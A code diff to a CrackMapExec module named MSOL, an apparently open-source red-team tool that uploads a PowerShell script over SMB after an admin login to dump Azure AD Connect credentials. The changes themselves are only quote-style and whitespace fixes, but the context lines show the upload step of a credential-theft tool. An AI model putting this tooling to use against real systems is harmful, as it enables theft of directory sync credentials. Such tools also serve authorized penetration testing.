@@ -1,4 +1,4 @@
-# MSOL module for CME 
+# MSOL module for CME
 # Author of the module : https://twitter.com/Daahtk
 # Based on the article : https://blog.xpnsec.com/azuread-connect-for-redteam/
 from sys import exit
@@ -37,7 +37,7 @@ class CMEModule:
         self.use_embedded = True
         self.msolmdl = self.cmd = ""
 
-        with open(get_ps_script('msol_dump/msol_dump.ps1'), 'r') as msolsc:
+        with open(get_ps_script("msol_dump/msol_dump.ps1"), "r") as msolsc:
             self.msol_embedded = msolsc.read()
 
         if "MSOL_PS1" in module_options:
@@ -51,7 +51,7 @@ class CMEModule:
     def on_admin_login(self, context, connection):
         if self.use_embedded:
             file_to_upload = "/tmp/msol.ps1"
-            with open(file_to_upload, 'w') as msol:
+            with open(file_to_upload, "w") as msol:
                 msol.write(self.msol_embedded)
         else:
             if path.isfile(self.MSOL_PS1):
@@ -61,7 +61,7 @@ class CMEModule:
                 exit(1)
 
         context.log.display(f"Uploading {self.msol}")
-        with open(file_to_upload, 'rb') as msol:
+        with open(file_to_upload, "rb") as msol:
             try:
                 connection.conn.putFile(self.share, f"{self.tmp_share}{self.msol}", msol.read)
                 context.log.success(f"Msol script successfully uploaded")
